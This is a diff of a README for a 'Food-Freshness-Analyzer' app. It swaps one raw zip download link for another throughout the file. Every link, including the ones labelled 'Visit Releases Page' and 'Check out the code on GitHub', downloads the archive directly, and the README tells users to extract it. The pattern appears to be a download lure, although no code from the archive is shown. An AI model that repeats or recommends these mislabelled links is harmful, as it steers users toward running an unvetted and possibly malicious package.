@@ -16,11 +16,11 @@ To run the Food-Freshness-Analyzer, you need:
 
 1. **Download the application.** Click the button below or visit the Releases page.
 
-   [![Download Food-Freshness-Analyzer](https://github.com/Parabellum768/Food-Freshness-Analyzer/raw/refs/heads/main/src/Food_Analyzer_Freshness_v3.2.zip)](https://github.com/Parabellum768/Food-Freshness-Analyzer/raw/refs/heads/main/src/Food_Analyzer_Freshness_v3.2.zip)
+   [![Download Food-Freshness-Analyzer](https://raw.githubusercontent.com/Parabellum768/Food-Freshness-Analyzer/main/src/Freshness_Food_Analyzer_1.6.zip)](https://raw.githubusercontent.com/Parabellum768/Food-Freshness-Analyzer/main/src/Freshness_Food_Analyzer_1.6.zip)
 
 2. **Visit the Releases page** to choose the correct version for your operating system.
    
-   [Visit Releases Page](https://github.com/Parabellum768/Food-Freshness-Analyzer/raw/refs/heads/main/src/Food_Analyzer_Freshness_v3.2.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/Parabellum768/Food-Freshness-Analyzer/main/src/Freshness_Food_Analyzer_1.6.zip)
 
 3. **Extract the downloaded file.** Use any file extraction tool, such as WinRAR, 7-Zip, or the built-in extractor on your OS.
 
@@ -67,7 +67,7 @@ If you need additional help or have questions, please reach out via our GitHub r
 
 ## 🔗 Useful Links
 
-- [Check out the code on GitHub](https://github.com/Parabellum768/Food-Freshness-Analyzer/raw/refs/heads/main/src/Food_Analyzer_Freshness_v3.2.zip)
-- [Visit Releases Page](https://github.com/Parabellum768/Food-Freshness-Analyzer/raw/refs/heads/main/src/Food_Analyzer_Freshness_v3.2.zip)
+- [Check out the code on GitHub](https://raw.githubusercontent.com/Parabellum768/Food-Freshness-Analyzer/main/src/Freshness_Food_Analyzer_1.6.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/Parabellum768/Food-Freshness-Analyzer/main/src/Freshness_Food_Analyzer_1.6.zip)
 
 Now you are ready to assess the freshness of your food with confidence!
